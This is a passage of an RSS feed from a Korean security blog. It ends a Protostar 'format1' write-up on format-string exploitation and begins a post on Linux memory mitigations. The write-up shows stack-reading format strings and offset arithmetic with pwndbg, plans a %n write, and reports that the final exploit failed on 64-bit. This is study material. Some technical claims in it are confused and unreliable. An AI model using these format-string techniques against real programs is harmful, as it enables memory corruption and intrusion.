&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vuln&lt;/code&gt; 함수가 콜되었을 때의 스택 프레임이다. 함수를 시작할 때 패스했던 인자의 시작 주소는 이중 배열인 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;argv&lt;/code&gt; 의 두 번째 인덱스에 저장되고, 이 시작 주소 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;argv[1][0]&lt;/code&gt; 은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vuln()&lt;/code&gt; 함수에게 인자로 전달된다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/format1/Untitled%202.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;그리고 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vuln()&lt;/code&gt; 스택 프레임 안에서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf()&lt;/code&gt; 함수를 콜했을 때의 스택 프레임이다. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf()&lt;/code&gt; 에게 첫 번째 인자로 주어진 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;string&lt;/code&gt;, 실제로는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;argv[1][0]&lt;/code&gt; 가 포인터의 형태로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rdi&lt;/code&gt; 에 들어간 것을 확인할 수 있다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/format1/Untitled%203.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;그렇다면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;format1&lt;/code&gt; 프로그램에게 인자로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%5$p.%4$x.$n&lt;/code&gt; 을 준다면 어떻게 될까? 아래 사진은 읽어들인 내용이 모두 보이도록 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%{int}${format}&lt;/code&gt; 의 형식을 취하지 않았고, 균일한 형식으로 보이게 하기 위해 동일한 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%p&lt;/code&gt; 포맷 스트링을 사용했으나 개수를 기준으로 설명하겠다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/format1/Untitled%204.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/format1/Untitled%205.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;직전의 스택 프레임 사진을 고려하면&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;출력할 스트링의 시작주소를 담고 있는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rdi&lt;/code&gt; 를 제외한 나머지 5개의 레지스터에 저장된 값을 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%p&lt;/code&gt; 포맷 스트링이 읽어들이고&lt;/li&gt;
  &lt;li&gt;스택에 저장된 값을 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fastcall&lt;/code&gt; calling convention에 따라 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf&lt;/code&gt;의 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rbp(sfp)&lt;/code&gt; 를 뛰어넘어서 바로 아래에 있던 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vuln()&lt;/code&gt;의 스택 4개 주소를 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%x&lt;/code&gt;가 읽어온 것(스택 사진과 값이 다른 점이 있으나 이건 다른 시점에 찍어서 그렇다. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf&lt;/code&gt; 가 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vsprintf&lt;/code&gt; 를 내부적으로 콜하고 그 안에서 stdout이 이루어지는 것 같은데 거기까지 가서 찾기는 좀… 그래…)&lt;/li&gt;
  &lt;li&gt;조금 논외로, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vuln()&lt;/code&gt; 의 스택 프레임을 그린 사진과 바로 위에서 확인되는 실제 스택 프레임의 구조가 다른데, 내가 알기로는… 컴파일 당시 컴파일러는 최적화를 위해 로컬변수선언이 안된 함수의 경우 외부에서 받아온 인자를 굳이 스택에 저장하지 않는데 왜 저장했는지 모르겠다. 이걸 어디에서 찾아야 할지 감이 안 와&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;을 확인할 수 있다.&lt;/p&gt;

&lt;p&gt;따라서 마지막에 사용된 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%n&lt;/code&gt; 은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x7fffffffdfa0&lt;/code&gt; 주소 안에 있는 값을 메모리 주소로 생각하고 해당 주소에 자신이 나오기 전까지 출력됐던 글자수를 입력할 것이다.&lt;/p&gt;

&lt;p&gt;즉, 이 익스플로잇의 요지는 아래와 같다.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%n&lt;/code&gt; 이 읽어올 메모리 주소 안의 값이 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;target&lt;/code&gt; 변수의 주소가 되도록 하는 것.&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;위의 목적은 사용자가 변조할 수 있는 유일한 위치, 즉 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;argv[1][0]&lt;/code&gt; 에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;target&lt;/code&gt; 변수의 주소를 주고 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%n&lt;/code&gt; 이 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;argv[1][0]&lt;/code&gt; 에 접근하게 함으로써 성취할 수 있다.&lt;/p&gt;

&lt;p&gt;그렇다면, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;argv[1][0]&lt;/code&gt; 은 대체 어디에 있고 얼마나 많은 스택의 주소를 읽어야 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%n&lt;/code&gt; 이 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;argv[1][0]&lt;/code&gt; 에 접근할 수 있을까?&lt;/p&gt;

&lt;p&gt;이를 알기 위해 pwndbg를 붙여 main을 디스어셈블해서 전체적인 흐름을 파악하고 실제로 실행해서 스택 구성이 어떻게 되었는지 확인해 보았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/format1/Untitled%206.jpeg&quot; alt=&quot;main 함수의 디스어셈블 결과.&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;main 함수의 디스어셈블 결과.&lt;/p&gt;

&lt;p&gt;하얗게 하이라이트가 된 부분이 바로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;argv[0][0]&lt;/code&gt; 의 위치다. 바로 위의 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rbp-0x4&lt;/code&gt; 는 확보한 공간으로 미루어볼 때 int type인 argv일 것이다. 그렇다면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;argv[1][0]&lt;/code&gt; 은 아마 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;argv[0][0]&lt;/code&gt; 의 바로 다음 바이트에 있을 것이다. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;argv&lt;/code&gt; 는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;char **&lt;/code&gt; 타입이기 때문이다. 그렇다면 당연히 확보 공간도 1바이트겠지!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/format1/Untitled%207.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rbp-0x10&lt;/code&gt; 이 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsp&lt;/code&gt; 의 위치인 것을 확인했다. 이중배열답게 두 번 참조한 모습이다. 따라서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;argv[1]&lt;/code&gt; 은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x7fffffffe088&lt;/code&gt; 의 바로 다음 주소인 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x7fffffffe090&lt;/code&gt; 일 것이다. 그리고 해당 주소에 담긴 값이 바로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;argv[1][0]&lt;/code&gt; 일 테다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/format1/Untitled%208.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x7fffffffe3f0&lt;/code&gt; 이 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;argv[1][0]&lt;/code&gt; 의 주소임을 확인했다. 해당 주소에 정말로 내가 인자로 입력했던 문자열이 저장되어 있는지 확인해 보았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/format1/Untitled%209.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;확인 완료!&lt;/p&gt;

&lt;p&gt;현재 ASLR이 꺼져 있기 때문에, 스택의 위치는 고정이다. 따라서 앞서 확인했던 ‘스택이 참조될 때 가장 먼저 참조되는 주소’는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x7fffffffdf80&lt;/code&gt; 으로 고정일 것이다.&lt;/p&gt;

&lt;p&gt;즉, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x7fffffffdf80&lt;/code&gt; 에서부터 시작해 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x7fffffffe3e8&lt;/code&gt; 까지를 참조해야 마지막에 올 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%n&lt;/code&gt; 은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x7fffffffe3f0&lt;/code&gt; 을 참조할 수 있을 것이다.&lt;/p&gt;

&lt;p&gt;(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x7fffffffe3e8&lt;/code&gt;  -  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x7fffffffdf80&lt;/code&gt;)/8 = 141이다. 메모리 한 주소가 1byte짜리이기 때문에 1byte씩을 읽어 오는 포맷 스트링 몇 개가 필요한지 알아내기 위해 8로 나누었다.&lt;/p&gt;

&lt;p&gt;즉, 만약 5개의 레지스터 + 142개의 주소를 읽어 온다면 맨 마지막에 내가 입력해준 문자열인 ‘AAAAAAAA’가 확인될 것이다. 예상이 맞는지 직접 프로그램에 인자를 주어 실행해 보았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/format1/Untitled%2010.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;어? 내 입력값을 읽어온 건 맞는데…. 처음 4바이트가 잘렸다. 왜지?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/format1/Untitled%2011.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;아하… 입력값 길이가 달라지면 문자열의 시작 주소도 달라지는 모양이다.(이걸 보고 스택의 높이가 변한다고 하고(참), root 계정으로 파이썬 익스플로잇을 만들어야 스택의 높이가 변하지 않는다고 하더라(확인되지 않음. 정말 카더라임) )&lt;/p&gt;

&lt;p&gt;시작 주소 차이가 -3만큼 나고 문자열의 길이 차이가 +3만큼 나는 걸 생각하면 끝 주소를 고정해 놓은 것으로 추측된다. 그렇다면 어차피 근사한 위치이기 때문에 실제 익스플로잇 페이로드를 넣어보면서 오차를 좁히는 것이 가장 효율적인 방안일 것이다.&lt;/p&gt;

&lt;p&gt;충분히 수학적으로 계산해서 정확하게 읽어야 할 주소의 개수를 구할 수 있을 것 같은데 왜 굳이 삽질을 하냐는 의문이 들 수 있다. 그런데 계산이 더 삽질이다… 마지막에 서술해 두었다.&lt;/p&gt;

&lt;p&gt;아무튼, 근사치를 구해 보면,&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/format1/Untitled%2012.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;아무래도 뒤의 A 4개 대신 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;target&lt;/code&gt;의 주소를 넣는 게 맞을 것 같다. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;target&lt;/code&gt;의 주소는 objdump를 떠서도 구할 수 있는데, 나는 pwndbg를 이용해 구했다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/format1/Untitled%2013.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x0060103c&lt;/code&gt;인 것으로 확인되었다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/format1/Untitled%2014.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;64비트 환경에서 포인터 타입의 데이터는 1byte로 인식되기 때문에, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x000000000060103c&lt;/code&gt; 를 입력값으로 넣을 수 있도록…. 했는데&lt;/p&gt;

&lt;p&gt;.&lt;/p&gt;

&lt;p&gt;.&lt;/p&gt;

&lt;p&gt;.&lt;/p&gt;

&lt;p&gt;.&lt;/p&gt;

&lt;p&gt;.&lt;/p&gt;

&lt;p&gt;.&lt;/p&gt;

&lt;p&gt;불가능하다는 것을 확인받았다. argument로 null byte를 전달하는 방법이… 없더라… input으로 전달이라면 얼마든지 어떻게든 해볼 수 있었겠지만 argument로 전달하는 건 진짜 안 되더라. 다른 분들께 물어보니 그건 0이 필수로 포함되는 64비트 환경에서는 안 되는 문제라는 답을 받을 수 있었다.&lt;/p&gt;

&lt;p&gt;그치만 이 문제를 64비트에서 해결하실 수 있는 분… 꼭 연락 주세요. 분명히 방법이 있을 텐데….
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;3-논외-수학적으로-읽어야-할-주소-개수-구하기를-시도했는데-고려한-변수가-한두개가-아니라-포기한-건에-대하여&quot;&gt;3. 논외-수학적으로 읽어야 할 주소 개수 구하기를 시도했는데 고려한 변수가 한두개가 아니라 포기한 건에 대하여&lt;/h1&gt;

&lt;p&gt;웹소설 제목 st 소제목 기막히죠&lt;/p&gt;

&lt;p&gt;length=x(null 제외) 문자열을 넣었을 때&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/format1/Untitled%2015.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;문자열의 끝 주소: 0x7fffffffe401인데 null이 여기 오는 거 감안하면 0x7fffffffe400을 끝 주소로 봐도 무방함&lt;/p&gt;

&lt;p&gt;따라서 문자열의 시작 주소는 0x7fffffffe400-(x-1)&lt;/p&gt;

&lt;p&gt;{0x7fffffffe400-(x-1) - 0x7fffffffdf80}/8 = 문자열의 시작 주소까지 읽어야 하는 주소의 수&lt;/p&gt;

&lt;p&gt;{1152-(x-1)}/8 = 144-(x-1)/8&lt;/p&gt;

&lt;p&gt;따라서 입력한 문자열이 null byte 제외 x글자일 때, 해당 문자열의 시작이 나오도록 하기 위해 읽어야 하는 주소의 수는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;144-(x-1)/8&lt;/code&gt; 이다.&lt;/p&gt;

&lt;p&gt;예를 들어 ‘AAAAAAAA..%5$x..%{3자리_수}$p…’ 면 25글자이기 때문에 들어가야 하는 3자리 수는 144-(25-1)/8 = 144-24/8 = 144-3 = 141 이다.&lt;/p&gt;

&lt;p&gt;즉, ‘AAAAAAAA..%5$x..%141$p…’ 를 입력해야 한다.&lt;/p&gt;

&lt;p&gt;그러나 논리상 맞는데 이상하게 오차가 생겼다. 왜인지 확인해 보니…&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/format1/Untitled%2016.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;입력값 길이가 달라지면… 달라진 입력값 길이/8 을 올림한 만큼…. 스택은 더 위로 이동하는 것 같았다. 이곳저곳에 조언을 구해 보니, 입력값이 늘어나면 늘어날수록 시스템이 더 큰 공간을 할당해 주고, 거기에 문제가 없도록 여유 공간 또한 주기 때문에 스택 프레임의 위치가 더 위로 이동하게 된다고 하더라. (아래 그림과 위 그림 비교)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/format1/Untitled%205.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;그래서 그것까지 계산하느니 그냥 근사값 가지고 때려 맞추는 게 더 나을 것 같아서 수학적 계산은 그만뒀다.&lt;/p&gt;
</description>
        <pubDate>Mon, 05 Dec 2022 09:20:58 -0600</pubDate>
        <link>https://touBVa.github.io/blog/system_hacking/protostar-format1/</link>
        <guid isPermaLink="true">https://touBVa.github.io/blog/system_hacking/protostar-format1/</guid>
      </item>
    
      <item>
        <title>Memory Exploit Mitigations and How to Bypass them 01</title>
        <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#0-memory-exploit-mitigation-techniques&quot; id=&quot;markdown-toc-0-memory-exploit-mitigation-techniques&quot;&gt;0. Memory Exploit Mitigation Techniques&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#01-linux&quot; id=&quot;markdown-toc-01-linux&quot;&gt;0.1. Linux&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#011-aslraddress-space-layout-randomization&quot; id=&quot;markdown-toc-011-aslraddress-space-layout-randomization&quot;&gt;0.1.1. ASLR(Address Space Layout Randomization)&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#012-ascii-armor&quot; id=&quot;markdown-toc-012-ascii-armor&quot;&gt;0.1.2. ASCII-Armor&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#013-fortify_source&quot; id=&quot;markdown-toc-013-fortify_source&quot;&gt;0.1.3. FORTIFY_SOURCE&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#014-nx-bitno-execute-bit&quot; id=&quot;markdown-toc-014-nx-bitno-execute-bit&quot;&gt;0.1.4. NX-bit(No-eXecute bit)&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#015-pieposition-independent-executable&quot; id=&quot;markdown-toc-015-pieposition-independent-executable&quot;&gt;0.1.5. PIE(Position Independent Executable)&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#016-relrorelocation-read-only&quot; id=&quot;markdown-toc-016-relrorelocation-read-only&quot;&gt;0.1.6. RELRO(RELocation Read-Only)&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#017-sspstack-smashing-protector&quot; id=&quot;markdown-toc-017-sspstack-smashing-protector&quot;&gt;0.1.7. SSP(Stack Smashing Protector)&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#1-how-to-bypass-them&quot; id=&quot;markdown-toc-1-how-to-bypass-them&quot;&gt;1. How to Bypass them&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#01-linux-1&quot; id=&quot;markdown-toc-01-linux-1&quot;&gt;0.1. Linux&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#011-aslraddress-space-layout-randomization-1&quot; id=&quot;markdown-toc-011-aslraddress-space-layout-randomization-1&quot;&gt;0.1.1. ASLR(Address Space Layout Randomization)&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#012-ascii-armor-1&quot; id=&quot;markdown-toc-012-ascii-armor-1&quot;&gt;0.1.2. ASCII-Armor&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#013-fortify_source-1&quot; id=&quot;markdown-toc-013-fortify_source-1&quot;&gt;0.1.3. FORTIFY_SOURCE&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#014-nx-bit&quot; id=&quot;markdown-toc-014-nx-bit&quot;&gt;0.1.4. NX-bit&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#015-pieposition-independent-executable-1&quot; id=&quot;markdown-toc-015-pieposition-independent-executable-1&quot;&gt;0.1.5. PIE(Position Independent Executable)&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#016-relrorelocation-read-only-1&quot; id=&quot;markdown-toc-016-relrorelocation-read-only-1&quot;&gt;0.1.6. RELRO(RELocation Read-Only)&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#017-sspstack-smashing-protector-1&quot; id=&quot;markdown-toc-017-sspstack-smashing-protector-1&quot;&gt;0.1.7. SSP(Stack Smashing Protector)&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;아직 윈도우 메모리 보호 기법은 다루지 못했다. 또한 다음 포스트로는 보호 기법 우회 실습을 다루려 한다.&lt;/p&gt;

&lt;h1 id=&quot;0-memory-exploit-mitigation-techniques&quot;&gt;0. Memory Exploit Mitigation Techniques&lt;/h1&gt;

&lt;h2 id=&quot;01-linux&quot;&gt;0.1. Linux&lt;/h2&gt;

&lt;p&gt;이어 말할 메모리 보호 기법을 더 잘 이해하기 위해 리눅스의 프로세스 메모리 구조를 명시한다.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;.code(.text): RE&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;.rodata: R, 상수 저장&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;.data: RW, 초기화한 전역 변수 저장&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;.bss: RW, 초기화 되기 전의 전역 변수 저장&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;heap: RW, 동적으로 메모리를 할당할 때 사용&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;stack: RW, 지역 변수 저장&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;OS Kernel Space&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;(Low to High address)
.bss 영역에 있던 초기화 되기 전의 전역 변수들은 main이 실행되기 전에 0으로 초기화되어 .data 영역에 저장된다.&lt;/p&gt;

&lt;h3 id=&quot;011-aslraddress-space-layout-randomization&quot;&gt;0.1.1. ASLR(Address Space Layout Randomization)&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;공유 라이브러리, 스택 및 힙, 실행 파일의 베이스가 매핑되는 메모리 영역의 주소를 Randomization 한다.&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;공격자가 공격에 필요한 정확한 메모리 주소를 알아내 공격에 사용하는 것을 막아주는 기법이다. 리눅스에서는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;randomize_va_space&lt;/code&gt; 파일에 int 값으로 옵션이 저장되는데, 이 값이 0일 경우 해제, 1일 경우 스택과 라이브러리 랜덤화, 2일 경우 스택, 라이브러리 및 힙까지 랜덤화를 할 수 있다.&lt;/p&gt;

&lt;h3 id=&quot;012-ascii-armor&quot;&gt;0.1.2. ASCII-Armor&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;공유 라이브러리 매핑 시, 주소값의 상위 1바이트를 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x00&lt;/code&gt;이 되도록 배치한다.&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x00&lt;/code&gt; 은 ASCII로 NULL을 의미한다. 보통 문자열 관련 함수들은 NULL 문자를 문자의 끝이라고 인식하기 때문에, ASCII-Armor는 문자열 관련 함수를 이용한 라이브러리 주소 편집/사용이 불가능해지게 만든다. 따라서, RTL과 같이 라이브러리 주소를 이용한 공격을 까다롭게 만든다.&lt;/p&gt;

&lt;h3 id=&quot;013-fortify_source&quot;&gt;0.1.3. FORTIFY_SOURCE&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;strcpy, memset과 같은 메모리 버퍼 관련 함수 실행 시, 기존 함수 대신 src와 dst의 크기를 비교하는 검사를 수행하는 빌트인 함수로 대체해 실행시킨다.&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;입력값이 저장될 위치의 크기와 입력값의 크기를 비교하는 것이므로, SSP와 달리 스택에 할당되지 않은 변수에 대한 오버플로우 검사가 가능하다.&lt;/p&gt;

&lt;p&gt;적용하기 위해서는 gcc 컴파일 시 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-D_FORTIFY_SOURCE=N&lt;/code&gt; 옵션을 추가해야 하고, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-O1&lt;/code&gt; 이상의 최적화 옵션도 추가해 주어야 한다.&lt;/p&gt;

&lt;h3 id=&quot;014-nx-bitno-execute-bit&quot;&gt;0.1.4. NX-bit(No-eXecute bit)&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;데이터 영역의 메모리 페이지를 NX 특성으로 지정해 BOF를 이용한 쉘코드 실행 공격을 불가능하게 만든다.&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;리눅스의 프로세스 메모리 5개 영역 중, 코드 영역과 데이터 영역의 실행 권한을 명확하게 분리하려는 정책이다.&lt;/p&gt;

&lt;h3 id=&quot;015-pieposition-independent-executable&quot;&gt;0.1.5. PIE(Position Independent Executable)&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;프로그램의 바이너리 코드가 매핑되는 메모리 영역이 매번 달라지게 하는 기법이다.&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;따라서, plt나 got 영역에 접근해 라이브러리 함수의 절대 주소를 알아내 익스플로잇에 이용하는 기존 기법이 어려워졌다. 또한 코드 영역의 주소가 실행될 때마다 변화하므로 ROP 등의 코드 재사용 공격을 막을 수 있다.&lt;/p&gt;

&lt;p&gt;컴파일러가 제공하는 보안 기능이기 때문에, 컴파일러 옵션으로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-no-pie&lt;/code&gt;를 주어서 끌 수 있다.&lt;/p&gt;

&lt;h3 id=&quot;016-relrorelocation-read-only&quot;&gt;0.1.6. RELRO(RELocation Read-Only)&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;ELF binary의 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.dynamic&lt;/code&gt; 섹션을 RO로 설정해 데이터 섹션의 보안을 강화하는 보호기술&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;Relocation Table이란 프로그램이 실행되기 위해 어느 부분에 relocation이 필요한지 보관하고 있는 영역으로, 라이브러리 함수의 주소를 담고 있는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.got&lt;/code&gt; 등이 이에 해당된다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Partial RELRO-Lazy Binding
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dynamic&lt;/code&gt; 영역의 쓰기 권한을 없애 버린다.
        &lt;ul&gt;
          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dynamic&lt;/code&gt; 영역이란?
            &lt;ul&gt;
